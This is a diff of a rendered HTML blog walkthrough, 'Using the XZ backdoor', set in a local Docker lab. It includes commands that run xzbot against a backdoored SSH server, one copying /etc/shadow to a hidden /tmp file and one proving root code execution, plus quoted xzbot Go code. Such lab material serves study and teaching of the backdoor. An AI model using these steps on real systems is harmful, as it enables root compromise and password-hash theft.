@@ -175,21 +175,26 @@ Google, which isn’t relevant, but it makes me feel better about not
 being able to figure this out on my own.</p>
 <p>In your hacking environment, run <a
 href="https://github.com/dguerri/exploits-collection/tree/main?tab=readme-ov-file#how-to-use">the
-setup commands</a>: &gt;
-<code>bash &gt; git clone https://github.com/dguerri/exploits-collection.git &gt; cd exploits-collection &gt; git submodule update --init --recursive &gt;</code></p>
+setup commands</a>:</p>
+<blockquote>
 <div class="sourceCode" id="cb4"><pre
-class="sourceCode bash"><code class="sourceCode bash"><span id="cb4-1"><a href="#cb4-1" aria-hidden="true" tabindex="-1"></a><span class="bu">cd</span> xz-5.6.1-backdoor</span>
-<span id="cb4-2"><a href="#cb4-2" aria-hidden="true" tabindex="-1"></a><span class="fu">git</span> submodule update <span class="at">--init</span> <span class="at">--recursive</span></span></code></pre></div>
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb4-1"><a href="#cb4-1" aria-hidden="true" tabindex="-1"></a><span class="fu">git</span> clone https://github.com/dguerri/exploits-collection.git</span>
+<span id="cb4-2"><a href="#cb4-2" aria-hidden="true" tabindex="-1"></a><span class="bu">cd</span> exploits-collection</span>
+<span id="cb4-3"><a href="#cb4-3" aria-hidden="true" tabindex="-1"></a><span class="fu">git</span> submodule update <span class="at">--init</span> <span class="at">--recursive</span></span></code></pre></div>
+</blockquote>
+<div class="sourceCode" id="cb5"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb5-1"><a href="#cb5-1" aria-hidden="true" tabindex="-1"></a><span class="bu">cd</span> xz-5.6.1-backdoor</span>
+<span id="cb5-2"><a href="#cb5-2" aria-hidden="true" tabindex="-1"></a><span class="fu">git</span> submodule update <span class="at">--init</span> <span class="at">--recursive</span></span></code></pre></div>
 <h3 id="running-the-containers">Running the containers</h3>
 <p>Now, you should be in the <a
 href="https://github.com/dguerri/exploits-collection/tree/main/xz-5.6.1-backdoor"><code>xz-5.6.1-backdoor</code></a>
 folder.</p>
 <p>Then, start the vulnerable server in the background.</p>
-<div class="sourceCode" id="cb5"><pre
-class="sourceCode bash"><code class="sourceCode bash"><span id="cb5-1"><a href="#cb5-1" aria-hidden="true" tabindex="-1"></a><span class="ex">docker</span> compose up <span class="at">--build</span> <span class="at">-d</span></span></code></pre></div>
-<p>This will create two networked containers: 1.
-<code>xzbackdoor-vulnerable</code> - This is what we will attack 2.
-<code>xzbackdoor-poc</code> - This is where we will attack from</p>
+<div class="sourceCode" id="cb6"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb6-1"><a href="#cb6-1" aria-hidden="true" tabindex="-1"></a><span class="ex">docker</span> compose up <span class="at">--build</span> <span class="at">-d</span></span></code></pre></div>
+<p>This will create two networked containers:</p>
+<pre><code>1. `xzbackdoor-vulnerable` - This is what we will attack
+2. `xzbackdoor-poc` - This is where we will attack from</code></pre>
 <p>(note that <a
 href="https://github.com/dguerri/exploits-collection/blob/08b65b557e93a6a8e9936c36febc6e9ef7ccbd8b/xz-5.6.1-backdoor/Makefile#L2">the
 Makefile</a> specifies <code>docker-compose</code>, but you’re probably
@@ -207,10 +212,11 @@ href="https://github.com/dguerri/exploits-collection/blob/08b65b557e93a6a8e9936c
 to execute the backdoor</a> via docker compose, but I have modified
 these instructions slightly to work from within the bash prompt of the
 docker instance.</p>
-<div class="sourceCode" id="cb6"><pre
-class="sourceCode bash"><code class="sourceCode bash"><span id="cb6-1"><a href="#cb6-1" aria-hidden="true" tabindex="-1"></a><span class="co"># start bash in the docker instance</span></span>
-<span id="cb6-2"><a href="#cb6-2" aria-hidden="true" tabindex="-1"></a><span class="ex">docker</span> exec <span class="at">-it</span> xzbackdoor-poc bash</span>
-<span id="cb6-3"><a href="#cb6-3" aria-hidden="true" tabindex="-1"></a><span class="bu">.</span> /opt/venv/bin/activate</span></code></pre></div>
+<div class="sourceCode" id="cb8"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb8-1"><a href="#cb8-1" aria-hidden="true" tabindex="-1"></a><span class="co"># start bash in the docker instance</span></span>
+<span id="cb8-2"><a href="#cb8-2" aria-hidden="true" tabindex="-1"></a><span class="ex">docker</span> exec <span class="at">-it</span> xzbackdoor-poc bash</span>
+<span id="cb8-3"><a href="#cb8-3" aria-hidden="true" tabindex="-1"></a><span class="co"># activate python environment (optional, but nice if you want to use patch.py)</span></span>
+<span id="cb8-4"><a href="#cb8-4" aria-hidden="true" tabindex="-1"></a><span class="bu">.</span> /opt/venv/bin/activate</span></code></pre></div>
 <p>From here, we can attack the system as if we were running commands on
 it normally.</p>
 <blockquote>
@@ -223,14 +229,14 @@ its seed are printed out and stored in
 <p>We want to get the seed that it randomly generated during setup. In
 the real world, this is reminiscent of the private key that only the
 original creators of the exploit have.</p>
-<div class="sourceCode" id="cb7"><pre
-class="sourceCode bash"><code class="sourceCode bash"><span id="cb7-1"><a href="#cb7-1" aria-hidden="true" tabindex="-1"></a><span class="co"># this extracts the seed from the information printed during the challenge setup</span></span>
-<span id="cb7-2"><a href="#cb7-2" aria-hidden="true" tabindex="-1"></a><span class="va">seed</span><span class="op">=</span><span class="st">&quot;</span><span class="va">$(</span><span class="fu">sed</span> <span class="at">-n</span> <span class="st">&#39;s/^Seed: \([0-9][0-9]*\)/\1/p&#39;</span> /exploit/ed448info.txt<span class="va">)</span><span class="st">&quot;</span></span>
-<span id="cb7-3"><a href="#cb7-3" aria-hidden="true" tabindex="-1"></a><span class="co"># you can do &#39;cat /exploit/ed448info.txt&#39; for more information.</span></span></code></pre></div>
-<div class="sourceCode" id="cb8"><pre
-class="sourceCode bash"><code class="sourceCode bash"><span id="cb8-1"><a href="#cb8-1" aria-hidden="true" tabindex="-1"></a><span class="co"># Make sure you can run xzbot. ask it for help</span></span>
-<span id="cb8-2"><a href="#cb8-2" aria-hidden="true" tabindex="-1"></a><span class="ex">/exploit/xzbot/xzbot</span> <span class="at">--help</span></span>
-<span id="cb8-3"><a href="#cb8-3" aria-hidden="true" tabindex="-1"></a><span class="co"># (the specific installation location is arbitrary to this exercise)</span></span></code></pre></div>
+<div class="sourceCode" id="cb9"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb9-1"><a href="#cb9-1" aria-hidden="true" tabindex="-1"></a><span class="co"># this extracts the seed from the information printed during the challenge setup</span></span>
+<span id="cb9-2"><a href="#cb9-2" aria-hidden="true" tabindex="-1"></a><span class="va">seed</span><span class="op">=</span><span class="st">&quot;</span><span class="va">$(</span><span class="fu">sed</span> <span class="at">-n</span> <span class="st">&#39;s/^Seed: \([0-9][0-9]*\)/\1/p&#39;</span> /exploit/ed448info.txt<span class="va">)</span><span class="st">&quot;</span></span>
+<span id="cb9-3"><a href="#cb9-3" aria-hidden="true" tabindex="-1"></a><span class="co"># you can do &#39;cat /exploit/ed448info.txt&#39; for more information.</span></span></code></pre></div>
+<div class="sourceCode" id="cb10"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb10-1"><a href="#cb10-1" aria-hidden="true" tabindex="-1"></a><span class="co"># Make sure you can run xzbot. ask it for help</span></span>
+<span id="cb10-2"><a href="#cb10-2" aria-hidden="true" tabindex="-1"></a><span class="ex">/exploit/xzbot/xzbot</span> <span class="at">--help</span></span>
+<span id="cb10-3"><a href="#cb10-3" aria-hidden="true" tabindex="-1"></a><span class="co"># (the specific installation location is arbitrary to this exercise)</span></span></code></pre></div>
 <aside>
 <p>You should see:</p>
 <pre><code>Usage of /exploit/xzbot/xzbot:
@@ -241,11 +247,11 @@ class="sourceCode bash"><code class="sourceCode bash"><span id="cb8-1"><a href="
   -seed string
         ed448 seed, must match xz backdoor key (default &quot;0&quot;)</code></pre>
 </aside>
-<div class="sourceCode" id="cb10"><pre
-class="sourceCode bash"><code class="sourceCode bash"><span id="cb10-1"><a href="#cb10-1" aria-hidden="true" tabindex="-1"></a><span class="co"># use the seed we found earlier</span></span>
-<span id="cb10-2"><a href="#cb10-2" aria-hidden="true" tabindex="-1"></a><span class="ex">/exploit/xzbot/xzbot</span> <span class="at">-addr</span> xzbackdoor-vulnerable:22 <span class="at">-seed</span> <span class="st">&quot;</span><span class="va">$seed</span><span class="st">&quot;</span> <span class="at">-cmd</span> <span class="st">&quot;cat /etc/shadow &gt; /tmp/.xz&quot;</span></span></code></pre></div>
-<p>Note the output of this should end with “ssh: handshake failed: EOF”.
-This is normal.</p>
+<div class="sourceCode" id="cb12"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb12-1"><a href="#cb12-1" aria-hidden="true" tabindex="-1"></a><span class="co"># use the seed we found earlier</span></span>
+<span id="cb12-2"><a href="#cb12-2" aria-hidden="true" tabindex="-1"></a><span class="ex">/exploit/xzbot/xzbot</span> <span class="at">-addr</span> xzbackdoor-vulnerable:22 <span class="at">-seed</span> <span class="st">&quot;</span><span class="va">$seed</span><span class="st">&quot;</span> <span class="at">-cmd</span> <span class="st">&quot;cat /etc/shadow &gt; /tmp/.xz&quot;</span></span></code></pre></div>
+<p>Note the output of this should end with
+“<code>ssh: handshake failed: EOF</code>”. This is normal.</p>
 <aside>
 <details>
 <summary>
@@ -297,43 +303,45 @@ See expected output
 </aside>
 <p>Now, we can prove that we obtained remote code execution by opening
 another terminal and running:</p>
-<div class="sourceCode" id="cb12"><pre
-class="sourceCode bash"><code class="sourceCode bash"><span id="cb12-1"><a href="#cb12-1" aria-hidden="true" tabindex="-1"></a><span class="co"># go into the vulnerable docker container, and read the file that we created via our SSH connection</span></span>
-<span id="cb12-2"><a href="#cb12-2" aria-hidden="true" tabindex="-1"></a><span class="ex">docker</span> exec xzbackdoor-vulnerable cat /tmp/.xz</span></code></pre></div>
+<div class="sourceCode" id="cb14"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb14-1"><a href="#cb14-1" aria-hidden="true" tabindex="-1"></a><span class="co"># go into the vulnerable docker container, and read the file that we created via our SSH connection</span></span>
+<span id="cb14-2"><a href="#cb14-2" aria-hidden="true" tabindex="-1"></a><span class="ex">docker</span> exec xzbackdoor-vulnerable cat /tmp/.xz</span></code></pre></div>
 <p>To prove we’re executing as root, we can do the following from the
 attacking container:</p>
-<div class="sourceCode" id="cb13"><pre
-class="sourceCode bash"><code class="sourceCode bash"><span id="cb13-1"><a href="#cb13-1" aria-hidden="true" tabindex="-1"></a><span class="ex">/exploit/xzbot/xzbot</span> <span class="at">-addr</span> xzbackdoor-vulnerable:22 <span class="at">-seed</span> <span class="st">&quot;</span><span class="va">$seed</span><span class="st">&quot;</span> <span class="at">-cmd</span> <span class="st">&#39;echo &quot;current user: $(whoami)&quot; &gt; /tmp/whoami.txt&#39;</span></span></code></pre></div>
+<div class="sourceCode" id="cb15"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb15-1"><a href="#cb15-1" aria-hidden="true" tabindex="-1"></a><span class="ex">/exploit/xzbot/xzbot</span> <span class="at">-addr</span> xzbackdoor-vulnerable:22 <span class="at">-seed</span> <span class="st">&quot;</span><span class="va">$seed</span><span class="st">&quot;</span> <span class="at">-cmd</span> <span class="st">&#39;echo &quot;current user: $(whoami)&quot; &gt; /tmp/whoami.txt&#39;</span></span></code></pre></div>
 <p>and then prove it by opening another terminal and running:</p>
-<div class="sourceCode" id="cb14"><pre
-class="sourceCode bash"><code class="sourceCode bash"><span id="cb14-1"><a href="#cb14-1" aria-hidden="true" tabindex="-1"></a><span class="ex">docker</span> exec xzbackdoor-vulnerable cat /tmp/whoami.txt</span>
-<span id="cb14-2"><a href="#cb14-2" aria-hidden="true" tabindex="-1"></a><span class="co"># should print &#39;current user: root&#39;</span></span></code></pre></div>
+<div class="sourceCode" id="cb16"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb16-1"><a href="#cb16-1" aria-hidden="true" tabindex="-1"></a><span class="ex">docker</span> exec xzbackdoor-vulnerable cat /tmp/whoami.txt</span>
+<span id="cb16-2"><a href="#cb16-2" aria-hidden="true" tabindex="-1"></a><span class="co"># should print &#39;current user: root&#39;</span></span></code></pre></div>
 <p>This proves that we’re getting remote code execution as root.</p>
 <h3 id="analysis-of-xzbot">Analysis of xzbot</h3>
 <p>But, why are we using xzbot? Is it doing anything magical to help us
 out here?</p>
 <p>Nope! It’s just establishing the SSH connection with the appropriate
 key!</p>
-<div class="sourceCode" id="cb15"><pre
-class="sourceCode go"><code class="sourceCode go"><span id="cb15-1"><a href="#cb15-1" aria-hidden="true" tabindex="-1"></a>    <span class="co">// ...</span></span>
-<span id="cb15-2"><a href="#cb15-2" aria-hidden="true" tabindex="-1"></a>    signingKey <span class="op">:=</span> ed448<span class="op">.</span>NewKeyFromSeed<span class="op">(</span>seed<span class="op">[:])</span>     <span class="co">// creates a key from same seed as in vulnerable system</span></span>
-<span id="cb15-3"><a href="#cb15-3" aria-hidden="true" tabindex="-1"></a>    xz <span class="op">:=</span> <span class="op">&amp;</span>xzSigner<span class="op">{</span>                                <span class="co">// xzSigner takes a signing key and generates the appropriate public key</span></span>
-<span id="cb15-4"><a href="#cb15-4" aria-hidden="true" tabindex="-1"></a>        signingKey<span class="op">:</span>    signingKey<span class="op">,</span>                  </span>
-<span id="cb15-5"><a href="#cb15-5" aria-hidden="true" tabindex="-1"></a>        encryptionKey<span class="op">:</span> signingKey<span class="op">[</span>ed448<span class="op">.</span>SeedSize<span class="op">:],</span></span>
-<span id="cb15-6"><a href="#cb15-6" aria-hidden="true" tabindex="-1"></a>    <span class="op">}</span></span>
-<span id="cb15-7"><a href="#cb15-7" aria-hidden="true" tabindex="-1"></a>    <span class="co">// this creates an SSH client as the root user</span></span>
-<span id="cb15-8"><a href="#cb15-8" aria-hidden="true" tabindex="-1"></a>    config <span class="op">:=</span> <span class="op">&amp;</span>ssh<span class="op">.</span>ClientConfig<span class="op">{</span></span>
-<span id="cb15-9"><a href="#cb15-9" aria-hidden="true" tabindex="-1"></a>        User<span class="op">:</span> <span class="st">&quot;root&quot;</span><span class="op">,</span></span>
-<span id="cb15-10"><a href="#cb15-10" aria-hidden="true" tabindex="-1"></a>        Auth<span class="op">:</span> <span class="op">[]</span>ssh<span class="op">.</span>AuthMethod<span class="op">{</span>                     <span class="co">// Establishes the authentication method using the public</span></span>
-<span id="cb15-11"><a href="#cb15-11" aria-hidden="true" tabindex="-1"></a>            ssh<span class="op">.</span>PublicKeys<span class="op">(</span>xz<span class="op">),</span>                     <span class="co">//   key generated from the initial signing key and seed.</span></span>
-<span id="cb15-12"><a href="#cb15-12" aria-hidden="true" tabindex="-1"></a>        <span class="op">},</span></span>
-<span id="cb15-13"><a href="#cb15-13" aria-hidden="true" tabindex="-1"></a>        HostKeyCallback<span class="op">:</span> xz<span class="op">.</span>HostKeyCallback<span class="op">,</span>        <span class="co">// takes the SSH public key and computes a hash</span></span>
-<span id="cb15-14"><a href="#cb15-14" aria-hidden="true" tabindex="-1"></a>    <span class="op">}</span></span>
-<span id="cb15-15"><a href="#cb15-15" aria-hidden="true" tabindex="-1"></a>    client<span class="op">,</span> err <span class="op">:=</span> ssh<span class="op">.</span>Dial<span class="op">(</span><span class="st">&quot;tcp&quot;</span><span class="op">,</span> <span class="op">*</span>addr<span class="op">,</span> config<span class="op">)</span>   <span class="co">// establish an SSH connection</span></span>
-<span id="cb15-16"><a href="#cb15-16" aria-hidden="true" tabindex="-1"></a>    <span class="co">// ...</span></span></code></pre></div>
+<blockquote>
+<div class="sourceCode" id="cb17"><pre
+class="sourceCode go"><code class="sourceCode go"><span id="cb17-1"><a href="#cb17-1" aria-hidden="true" tabindex="-1"></a>  <span class="co">// ...</span></span>
+<span id="cb17-2"><a href="#cb17-2" aria-hidden="true" tabindex="-1"></a>  signingKey <span class="op">:=</span> ed448<span class="op">.</span>NewKeyFromSeed<span class="op">(</span>seed<span class="op">[:])</span>     <span class="co">// creates a key from same seed as in vulnerable system</span></span>
+<span id="cb17-3"><a href="#cb17-3" aria-hidden="true" tabindex="-1"></a>  xz <span class="op">:=</span> <span class="op">&amp;</span>xzSigner<span class="op">{</span>                                <span class="co">// xzSigner takes a signing key and generates the appropriate public key</span></span>
+<span id="cb17-4"><a href="#cb17-4" aria-hidden="true" tabindex="-1"></a>      signingKey<span class="op">:</span>    signingKey<span class="op">,</span></span>
+<span id="cb17-5"><a href="#cb17-5" aria-hidden="true" tabindex="-1"></a>      encryptionKey<span class="op">:</span> signingKey<span class="op">[</span>ed448<span class="op">.</span>SeedSize<span class="op">:],</span></span>
+<span id="cb17-6"><a href="#cb17-6" aria-hidden="true" tabindex="-1"></a>  <span class="op">}</span></span>
+<span id="cb17-7"><a href="#cb17-7" aria-hidden="true" tabindex="-1"></a>  <span class="co">// this creates an SSH client as the root user</span></span>
+<span id="cb17-8"><a href="#cb17-8" aria-hidden="true" tabindex="-1"></a>  config <span class="op">:=</span> <span class="op">&amp;</span>ssh<span class="op">.</span>ClientConfig<span class="op">{</span></span>
+<span id="cb17-9"><a href="#cb17-9" aria-hidden="true" tabindex="-1"></a>      User<span class="op">:</span> <span class="st">&quot;root&quot;</span><span class="op">,</span></span>
+<span id="cb17-10"><a href="#cb17-10" aria-hidden="true" tabindex="-1"></a>      Auth<span class="op">:</span> <span class="op">[]</span>ssh<span class="op">.</span>AuthMethod<span class="op">{</span>                     <span class="co">// Establishes the authentication method using the public</span></span>
+<span id="cb17-11"><a href="#cb17-11" aria-hidden="true" tabindex="-1"></a>          ssh<span class="op">.</span>PublicKeys<span class="op">(</span>xz<span class="op">),</span>                     <span class="co">//   key generated from the initial signing key and seed.</span></span>
+<span id="cb17-12"><a href="#cb17-12" aria-hidden="true" tabindex="-1"></a>      <span class="op">},</span></span>
+<span id="cb17-13"><a href="#cb17-13" aria-hidden="true" tabindex="-1"></a>      HostKeyCallback<span class="op">:</span> xz<span class="op">.</span>HostKeyCallback<span class="op">,</span>        <span class="co">// takes the SSH public key and computes a hash</span></span>
+<span id="cb17-14"><a href="#cb17-14" aria-hidden="true" tabindex="-1"></a>  <span class="op">}</span></span>
+<span id="cb17-15"><a href="#cb17-15" aria-hidden="true" tabindex="-1"></a>  client<span class="op">,</span> err <span class="op">:=</span> ssh<span class="op">.</span>Dial<span class="op">(</span><span class="st">&quot;tcp&quot;</span><span class="op">,</span> <span class="op">*</span>addr<span class="op">,</span> config<span class="op">)</span>   <span class="co">// establish an SSH connection</span></span>
+<span id="cb17-16"><a href="#cb17-16" aria-hidden="true" tabindex="-1"></a>  <span class="co">// ...</span></span></code></pre></div>
 <p>— <a
 href="https://github.com/amlweems/xzbot/blob/8ae5b706fb2c6040a91b233ea6ce39f9f09441d5/main.go#L193-L205">xzbot/main.go</a>
 (comments are mine)</p>
+</blockquote>
 <h2 id="how-to-exploit-without-using-xzbot">How to exploit without using
 xzbot?</h2>
 <p>TODO</p>
@@ -346,8 +354,8 @@ compilation of the resources I found to be helpful, with the date they
 were first posted.</p>
 <!-- make list of links easier to read -->
 <style>
-section#further-reading li, 
-section#further-reading a, 
+section#further-reading li,
+section#further-reading a,
 section#further-reading p {
     line-height: 1.1em;
     text-decoration: none;
@@ -481,6 +489,18 @@ on distrusting xz”</a> (2024-04-03)</p></li>
     <details>
       <summary>See edit history for "Using the XZ backdoor"</summary>
       <dl class="edits">
+        
+          <div class="edit">
+            <dt>
+              Zack Sargent edited this page on 
+              <time datetime="2024-04-05T11:58:50-04:00">
+                Friday, April 05, 2024 at 11:58 AM
+              </time>
+            </dt>
+            <dd>
+              1 file changed, 28 insertions(+), 24 deletions(-)
+            </dd>
+          </div>
         
           <div class="edit">
             <dt>
